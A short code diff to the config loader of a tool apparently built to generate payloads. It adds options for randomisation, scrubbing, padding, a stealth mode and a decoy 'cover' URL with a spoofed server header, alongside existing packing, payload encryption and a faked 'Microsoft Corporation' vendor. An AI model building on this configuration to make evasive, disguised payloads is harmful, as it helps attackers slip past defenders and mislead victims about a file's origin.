@@ -88,6 +88,12 @@ def load() -> dict:
         "upx": _bool(os.environ.get("PHANTOM_UPX"), _bool(builder.get("upx"), False)),
         "public_url": os.environ.get("PHANTOM_PUBLIC_URL", builder.get("public_url", "")),
         "vendor": os.environ.get("PHANTOM_VENDOR", builder.get("vendor", "Microsoft Corporation")),
+        "randomize": _bool(os.environ.get("PHANTOM_RANDOMIZE"),
+                           _bool(builder.get("randomize"), True)),
+        "scrub": _bool(os.environ.get("PHANTOM_SCRUB"), _bool(builder.get("scrub"), True)),
+        "pad": _bool(os.environ.get("PHANTOM_PAD"), _bool(builder.get("pad"), True)),
+        "stealth": os.environ.get("PHANTOM_STEALTH", builder.get("stealth", "auto")),
+        "workers": int(os.environ.get("PHANTOM_WORKERS", builder.get("workers", 4))),
         "encrypt_payload": _bool(os.environ.get("PHANTOM_ENCRYPT"),
                                  _bool(builder.get("encrypt_payload"), True)),
         "metadata": _bool(os.environ.get("PHANTOM_METADATA"),
@@ -118,6 +124,11 @@ def load() -> dict:
         },
         "auth": {"user": auth_user, "pass": auth_pass},
         "public_url": os.environ.get("PHANTOM_PUBLIC_URL", "").rstrip("/"),
+        "cover": {
+            "url": os.environ.get("PHANTOM_COVER", (raw.get("cover") or {}).get("url", "")).strip(),
+            "server": os.environ.get("PHANTOM_SERVER",
+                                     (raw.get("cover") or {}).get("server", "nginx")),
+        },
         "data_dir": str(data),
     }
 
